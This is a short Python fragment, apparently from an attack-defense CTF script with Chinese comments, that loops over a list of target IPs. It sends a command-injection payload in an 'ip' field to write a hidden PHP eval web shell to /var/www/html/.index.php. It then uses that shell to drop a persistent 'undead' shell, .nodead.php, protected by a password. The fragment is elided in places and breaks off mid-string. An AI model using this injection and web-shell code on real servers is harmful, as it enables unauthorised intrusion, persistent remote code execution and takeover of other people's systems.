...
def upload_muma1(ip_list):
    ...
    data = {"ip": "127.0.0.1;echo '<?php @eval($_REQUEST[\"cmd\"]);?>' > /var/www/html/.index.php"}  # 根据实际调整payload
    upload_res = {}
    ...
    for ip in ip_list:
        ...
        try:
            if requests.post(url, data=data, timeout=TIMEOUT).status_code == 200:
                ...
                url1 = f"http://{ip}/{ma1}"
                if requests.get(url=url1, timeout=0.5).status_code == 200:  # 访问不死马1，循环生成不死马2
    ...
    for ip, url in upload_res.items():
        if url:
            try:
                ...
                data = {
                    'cmd': 'system(\"echo \" |xxd -r -ps > /var/www/html/.nodead.php);'}
                ''' 不死马内容为  pass=nima
                <?php
